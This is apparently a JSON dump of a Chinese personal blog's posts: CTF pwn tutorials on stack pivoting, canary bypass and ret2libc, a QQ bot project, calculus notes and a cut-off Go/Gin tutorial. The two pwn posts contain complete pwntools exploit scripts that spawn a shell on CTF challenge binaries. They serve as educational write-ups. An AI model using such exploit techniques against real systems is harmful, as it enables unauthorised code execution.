[{"content":"前置知识：汇编语言（第4版）前半本\n 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret\n 函数调用栈的基本结构 一些寄存器的作用：\nEIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。\nEBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。\nESP：始终指向栈顶。\n在进入一个函数时，会执行如下操作。\npush eip+4\rpush ebp\rmov ebp,esp\r在执行完退出时，会执行如下操作。\nmov esp,ebp\rpop ebp\rpop eip\r即leave和ret。\n整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。\n函数调用栈工作时的结构如下图：\n其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：\nvoid func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。\n考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。\n但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。\n栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。\n也就是说，要构造栈中数据如图所示：\n至于为什么要-4，后面模拟的过程中读者自能体会。\n好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：\n然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：\n这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。\n例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)\n所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。\n惯例checksec，只开了NX。\nida分析得到：\nint vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); read(0, buf, 0x30u); return printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。\n第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。\n在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。\n结合文章开头函数调用栈的知识，不难理解，\u0026lsquo;bin/sh\u0026rsquo;和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。\n注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。\nEXP：\nfrom psutil import process_iter from pwn import * context(arch=\u0026#34;i386\u0026#34;,log_level=\u0026#34;debug\u0026#34;) op=0 e=ELF(\u0026#34;ciscn-s-4.bin\u0026#34;) sys_addr=e.symbols[\u0026#39;system\u0026#39;] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\u0026#34;ciscn-s-4.bin\u0026#34;) else: zeroy=remote(\u0026#34;node4.buuoj.cn\u0026#34;,27827) payload1=b\u0026#39;a\u0026#39;*0x24+b\u0026#34;bbbb\u0026#34; zeroy.recvuntil(\u0026#34;name?\u0026#34;) zeroy.send(payload1) zeroy.recvuntil(\u0026#34;bbbb\u0026#34;) ebp_addr=u32(zeroy.recv(4)) print(\u0026#34;ebp_addr: \u0026#34;,hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b\u0026#39;aaaa\u0026#39;+p32(buf_addr+12)+b\u0026#39;/bin/sh\\x00\u0026#39; payload2=payload2.ljust(0x28,b\u0026#39;a\u0026#39;)+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ","permalink":"https://zeroy.site/articles/CTFpwn1/","summary":"前置知识：汇编语言（第4版）前半本\n 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret\n 函数调用栈的基本结构 一些寄存器的作用：\nEIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。\nEBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。\nESP：始终指向栈顶。\n在进入一个函数时，会执行如下操作。\npush eip+4\rpush ebp\rmov ebp,esp\r在执行完退出时，会执行如下操作。\nmov esp,ebp\rpop ebp\rpop eip\r即leave和ret。\n整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。\n函数调用栈工作时的结构如下图：\n其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：\nvoid func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。\n考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。\n但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。\n栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。\n也就是说，要构造栈中数据如图所示：\n至于为什么要-4，后面模拟的过程中读者自能体会。\n好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：\n然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：\n这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。\n例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)\n所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。\n惯例checksec，只开了NX。\nida分析得到：\nint vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); read(0, buf, 0x30u); return printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。","title":"[PWN.0x00]函数调用栈结构与栈迁移"},{"content":"canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。\n是否开启canary的编译选项：\ngcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。\n如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。\nret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。\n如果这两者都不显性存在，就可以使用ret2libc方法。\n这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。\nlibc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\u0026quot;/bin/sh\u0026quot;) 来打开 shell。\n工作重心转向获取libc.so加载进内存的可利用的函数的地址。\n什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)\n深入理解GOT表和PLT表 - 知乎 (zhihu.com)\ngot表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com)\n简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。\n而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。\n例题：moeCTF2021 - baby canary checksec后发现开了NX和canary保护。\ncanary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。\npayload1=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+b\u0026#39;b\u0026#39; p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b\u0026#39;\\x00\u0026#39;)) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。\npayload2=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(puts_plt)+p32(e.symbols[\u0026#34;main\u0026#34;])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\u0026#34;he flag!\\n\u0026#34;) puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。\n完整exp：\nfrom pwn import * context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) local=1 e=ELF(\u0026#34;./baby_canary\u0026#34;) puts_got=e.got[\u0026#34;puts\u0026#34;] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\u0026#34;puts\u0026#34;] libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) def main(): if local: p=process(\u0026#34;./baby_canary\u0026#34;) else: p=remote(\u0026#34;114.67.175.224\u0026#34;,11482) p.recv() payload1=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+b\u0026#39;b\u0026#39; p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b\u0026#39;\\x00\u0026#39;)) p.recv() print(\u0026#34;canary: \u0026#34;,hex(canary)) payload2=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(puts_plt)+p32(e.symbols[\u0026#34;main\u0026#34;])+p32(puts_got) p.send(payload2) p.recvuntil(\u0026#34;he flag!\\n\u0026#34;) puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() p.recvuntil(\u0026#34;u are?\\n\u0026#34;) p.send(payload1) payload3=b\u0026#39;a\u0026#39;*(0x4c-0xc)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(system_addr)+b\u0026#39;aaaa\u0026#39;+p32(binsh_addr) p.send(payload3) p.interactive() main() 小插曲 实践中发现，在函数调用栈中除了该有的局部变量，有时会出现一些奇怪的变量，这是由编译器决定的，一般用于存储寄存器上下文。\n","permalink":"https://zeroy.site/articles/CTFpwn2/","summary":"canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。\n是否开启canary的编译选项：\ngcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。\n如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。\nret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。\n如果这两者都不显性存在，就可以使用ret2libc方法。\n这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。\nlibc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\u0026quot;/bin/sh\u0026quot;) 来打开 shell。\n工作重心转向获取libc.so加载进内存的可利用的函数的地址。\n什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)\n深入理解GOT表和PLT表 - 知乎 (zhihu.com)\ngot表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.","title":"[PWN.0x01]canary|partial overwrite|ret2libc"},{"content":"前言 2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。\n概述 项目地址：zeroy0410/NoyaBot (github.com)\n配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。\n我使用了Python-Flask作为项目的框架。\n机器人功能（截止2022/3/3）\n 闲聊   回答指定的问题 设定回答问题的概率   数学计算   计算能用一行字符串表示的Sympy库格式的数据   一言 翻译  /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项 数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。\n","permalink":"https://zeroy.site/articles/noya/","summary":"前言 2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。\n概述 项目地址：zeroy0410/NoyaBot (github.com)\n配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。\n我使用了Python-Flask作为项目的框架。\n机器人功能（截止2022/3/3）\n 闲聊   回答指定的问题 设定回答问题的概率   数学计算   计算能用一行字符串表示的Sympy库格式的数据   一言 翻译  /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项 数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。","title":"基于go-cqhttp的机器人NoyaBot"},{"content":"高等数学上册(微积分)必背公式总结 - 知乎 (zhihu.com)\n导数： $$ \\begin{align} \u0026amp;[\\cos(\\omega x+\\varphi)]^{(n)}=\\omega^n\\cos(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \u0026amp;[\\sin(\\omega x+\\varphi)]^{(n)}=\\omega^n\\sin(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \\end{align} $$\n重难点公式： $$ \\begin{align} \u0026amp;\\int\\frac{1}{a^2+x^2}dx=\\frac{1}{a}arctan\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{a^2-x^2}dx=\\frac{1}{2a}ln|\\frac{a+x}{a-x}|+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{a^2-x^2}}dx=arcsin\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x^2\\pm a^2}}dx=ln|x+\\sqrt{x^2\\pm a^2}|+C\\\\ \u0026amp;\\int{tan\\ x}dx=-ln|cos\\ x|+C\\\\ \u0026amp;\\int{cot\\ x}dx=ln|sin\\ x|+C\\\\ \u0026amp;\\int{csc\\ x}dx=ln|csc\\ x-cot\\ x|+C\\\\ \u0026amp;\\int{sec\\ x}dx=ln|sec\\ x+tan\\ x|+C\\\\ \u0026amp;\\int{sec^2\\ x}dx=tan\\ x+C\\\\ \u0026amp;\\int{csc^2\\ x}dx=-cot\\ x+C\\\\ \u0026amp;\\int{sec\\ x*tan\\ x}dx=sec\\ x+C\\\\ \u0026amp;\\int{csc\\ x*cot\\ x}dx=-csc\\ x+C\\\\ \\end{align} $$\n凑系数，拆项： $$ \\int{\\frac{x}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3-3}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3}{(2x+3)^2}}dx-\\frac{1}{2}\\int\\frac{3}{(2x+3)^2}dx\\ \u0026hellip; $$ 分子包含多项的，直接无法求解可以拆项求。\n常见的配凑： $$ \\begin{align} \u0026amp;xe^x:\\\\ \u0026amp;\\int\\frac{1+x}{x(xe^x+1)}dx=\\int\\frac{(1+x)e^x}{xe^x(xe^x+1)}dx=\\int\\frac{1}{xe^x(xe^x+1)}d(xe^x)\\overset{t=xe^x}=\\int\\frac{1}{t(t+1)}dt\\\\ \u0026amp;xlnx:\\\\ \u0026amp;\\int\\frac{(1+lnx)dx}{1+x^2ln^2x}=\\int\\frac{1}{1+(xlnx)^2}d(xlnx)\\\\ \u0026amp;\\frac{1}{\\sqrt{x}}:\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x(x+4)}}dx=2\\int\\frac{1}{2\\sqrt{x}\\sqrt{x+4}}dx=2\\int\\frac{1}{\\sqrt{4+\\sqrt{x}^2}}d{\\sqrt{x}}\\\\ \u0026amp;e^x:\\\\ \u0026amp;\\int f(e^x){\\rm dx}=\\int\\frac{f(e^x)}{e^x}{\\rm de^x}=\\int\\frac{f(t)}{t}{\\rm dt} \\end{align} $$\n一些题目： 1. $$ \\begin{align} (1):\\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026amp;=\\int\\frac{\\rm dx}{x^2\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026amp;=-\\int\\frac{\\rm d\\frac{1}{x}}{\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026amp;=-\\arcsin\\frac{1}{x}+C\\\\ \\end{align} $$ 2. $$ \\begin{align} (2):\\int\\frac{x{\\rm dx}}{x^2\\sqrt{x^2-1}}\u0026amp; =\\int\\frac{\\rm d\\sqrt{x^2-1}}{(\\sqrt{x^2-1})^2+1}\\\\ \u0026amp;=\\arctan\\sqrt{x^2-1}+C \\end{align} $$ 3. $$ (3)令\\sqrt{x^2-1}=x-t,有x=\\frac{t^2+1}{2t}\\\\ \\begin{align} \\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026amp;=-2\\int\\frac{\\rm dt}{t^2+1}\\\\ \u0026amp;=-2\\arctan t+C\\\\ \u0026amp;=-2\\arctan(x-\\sqrt{x^2-1})+C \\end{align} $$ 4. $$ \\begin{align} (4)I=\\int\\sqrt{Ax^2+B}{\\rm dx} \u0026amp;=x\\sqrt{Ax^2+B}-\\int\\frac{(Ax^2+B)-B}{\\sqrt{Ax^2+B}}{\\rm dx}\\\\ \u0026amp;=x\\sqrt{Ax^2+B}-I+\\int\\frac{B}{\\sqrt{Ax^2+B}}{\\rm dx} \\end{align} $$\n奇怪的配凑： $$ \\int\\frac{1}{\\sqrt{e^{2x}-1}}dx=\\int\\frac{1}{\\sqrt{e^{2x}(1-e^{-2x})}}dx=\\int\\frac{e^{-x}}{\\sqrt{1-e^{-2x}}} $$ 有理函数积分： $$ \\begin{align} \u0026amp;\\int\\frac{x-2}{x^2+x+1}dx=\\int\\frac{A(x^2+x+1)'+B}{x^2+x+1}dx\\\\ \u0026amp;A(2x+1)+B=x-2=\u0026gt;A=\\frac{1}{2},B=-\\frac{5}{2}\\\\ \u0026amp;=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{x^2+x+1}dx\\\\ \u0026amp;=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{(x+\\frac{1}{2})^2+\\frac{3}{4}}\\\\ \u0026amp;\\text{ps:当分母}\\triangle\u0026lt;0\\text{时才可以使用,否则直接裂项即可} \\end{align} $$ 表格法求积分：\n不定积分表格法的本质(推导) - 知乎 (zhihu.com) $$ \\int{x^2e^{2x}}dx=\\frac{1}{2}x^2e^{2x}-\\frac{1}{2}xe^{2x}+\\frac{1}{4}e^{2x}+C $$ 常见三角换元题： $$ \\begin{align} \u0026amp;\\int\\frac{x^2}{\\sqrt{1-x^2}}dx\\overset{x=sint}{=}\\int\\frac{sin^2t}{\\sqrt{1-sin^2t}}costdt=\\int{sintdt}\\\\ \u0026amp;\\int{x^2{\\sqrt{4-x^2}}}dx\\overset{x=2sint}{=}16\\int{sin^2tcos^2t}dt=8\\int{(\\frac{1}{2}sin2t)^2}dt\\\\ \\end{align} $$ 凑微分： $$ \\begin{align} \u0026amp;\\int\\frac{1}{x\\sqrt{1+x^2}}dx=\\int{\\frac{x}{x^2\\sqrt{1+x^2}}}dx=\\frac{1}{2}\\int{\\frac{1}{x^2\\sqrt{1+x^2}}}dx^2\\overset{t=x^2}{=}\\frac{1}{2}\\int{\\frac{1}{t\\sqrt{1+t}}}dt\\\\ \u0026amp;set\\ u=\\sqrt{1+t}\\\\ \u0026amp;=\\frac{1}{2}\\int{\\frac{2u}{(u^2-1)u}}du=\\int{\\frac{1}{u^2-1}}du=-\\frac{1}{2}ln|\\frac{1+u}{1-u}|+C \\end{align} $$ 倒代换： $$ \\int{\\frac{1}{x\\sqrt{x^4+x^2+1}}}dx\\overset{t=\\frac{1}{x}}{=}-\\int{\\frac{1}{\\frac{1}{t}\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}}dx=-\\frac{\\frac{1}{t}}{\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}dt=-\\frac{1}{2}\\int{\\frac{1}{\\sqrt{(t^2+\\frac{1}{2})^2+(\\frac{\\sqrt{3}}{2})^2}}}d(t^2+\\frac{1}{2}) $$\n一些巧题： $$ \\begin{align} \u0026amp;\\int{\\frac{1}{x\\sqrt{x^2-1}}}dx=\\int{\\frac{1}{x\\sqrt{x^2(1-\\frac{1}{x^2})}}}dx=\\int{\\frac{1}{x^2\\sqrt{1-\\frac{1}{x^2}}}}=-\\int{\\frac{1}{\\sqrt{1-(\\frac{1}{x})^2}}}d(\\frac{1}{x})\\\\ \u0026amp;\\int{\\frac{1-lnx}{(x-lnx)^2}}dx=\\int{\\frac{\\frac{1-lnx}{x^2}}{(1-\\frac{lnx}{x})^2}}dx=-\\int{\\frac{1}{(1-\\frac{lnx}{x})^2}}d(1-\\frac{lnx}{x})\\\\ \u0026amp;\\int{\\frac{1+x^2}{1+x^4}}dx=\\int{\\frac{\\frac{1}{x^2}+1}{\\frac{1}{x^2}+x^2}}dx=\\int{\\frac{d(x-\\frac{1}{x})}{(x-\\frac{1}{x})^2+2}}\\\\ \u0026amp;\\int{\\frac{1}{1+x^4}}dx=\\frac{1}{2}\\int{\\frac{1+x^2-(x^2-1)}{1+x^4}}dx\\\\ \\end{align} $$\n","permalink":"https://zeroy.site/articles/math-integrate/","summary":"高等数学上册(微积分)必背公式总结 - 知乎 (zhihu.com)\n导数： $$ \\begin{align} \u0026amp;[\\cos(\\omega x+\\varphi)]^{(n)}=\\omega^n\\cos(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \u0026amp;[\\sin(\\omega x+\\varphi)]^{(n)}=\\omega^n\\sin(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \\end{align} $$\n重难点公式： $$ \\begin{align} \u0026amp;\\int\\frac{1}{a^2+x^2}dx=\\frac{1}{a}arctan\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{a^2-x^2}dx=\\frac{1}{2a}ln|\\frac{a+x}{a-x}|+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{a^2-x^2}}dx=arcsin\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x^2\\pm a^2}}dx=ln|x+\\sqrt{x^2\\pm a^2}|+C\\\\ \u0026amp;\\int{tan\\ x}dx=-ln|cos\\ x|+C\\\\ \u0026amp;\\int{cot\\ x}dx=ln|sin\\ x|+C\\\\ \u0026amp;\\int{csc\\ x}dx=ln|csc\\ x-cot\\ x|+C\\\\ \u0026amp;\\int{sec\\ x}dx=ln|sec\\ x+tan\\ x|+C\\\\ \u0026amp;\\int{sec^2\\ x}dx=tan\\ x+C\\\\ \u0026amp;\\int{csc^2\\ x}dx=-cot\\ x+C\\\\ \u0026amp;\\int{sec\\ x*tan\\ x}dx=sec\\ x+C\\\\ \u0026amp;\\int{csc\\ x*cot\\ x}dx=-csc\\ x+C\\\\ \\end{align} $$\n凑系数，拆项： $$ \\int{\\frac{x}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3-3}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3}{(2x+3)^2}}dx-\\frac{1}{2}\\int\\frac{3}{(2x+3)^2}dx\\ \u0026hellip; $$ 分子包含多项的，直接无法求解可以拆项求。\n常见的配凑： $$ \\begin{align} \u0026amp;xe^x:\\\\ \u0026amp;\\int\\frac{1+x}{x(xe^x+1)}dx=\\int\\frac{(1+x)e^x}{xe^x(xe^x+1)}dx=\\int\\frac{1}{xe^x(xe^x+1)}d(xe^x)\\overset{t=xe^x}=\\int\\frac{1}{t(t+1)}dt\\\\ \u0026amp;xlnx:\\\\ \u0026amp;\\int\\frac{(1+lnx)dx}{1+x^2ln^2x}=\\int\\frac{1}{1+(xlnx)^2}d(xlnx)\\\\ \u0026amp;\\frac{1}{\\sqrt{x}}:\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x(x+4)}}dx=2\\int\\frac{1}{2\\sqrt{x}\\sqrt{x+4}}dx=2\\int\\frac{1}{\\sqrt{4+\\sqrt{x}^2}}d{\\sqrt{x}}\\\\ \u0026amp;e^x:\\\\ \u0026amp;\\int f(e^x){\\rm dx}=\\int\\frac{f(e^x)}{e^x}{\\rm de^x}=\\int\\frac{f(t)}{t}{\\rm dt} \\end{align} $$","title":"高等数学（上） 不定积分 总结"},{"content":"自带的net/http库的使用 http库提供了HTTP服务的用户端和服务端的实现。\n官方文档\nGo语言基础之net/http | 李文周的博客 (liwenzhou.com)\n示例代码\n监听本地端口，在浏览器输出Hello World字符串。\nfunc sayHello(w http.ResponseWriter,r *http.Request){ //ResponseWriter为服务端返回的内容 \tfmt.Fprintln(w, \u0026#34;Hello World!\u0026#34;) } func main(){ http.HandleFunc(\u0026#34;/\u0026#34;,sayHello) http.ListenAndServe(\u0026#34;:8080\u0026#34;,nil) } Gin框架 简介 Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。\n官方中文文档\nGin框架介绍及使用 | 李文周的博客 (liwenzhou.com)\n特性\nGin v1 稳定的特性:  零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。  框架初识 使用Gin框架返回一个json文件\nfunc sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \t\u0026#34;message\u0026#34;:\u0026#34;HelloWorld\u0026#34;, }) } func 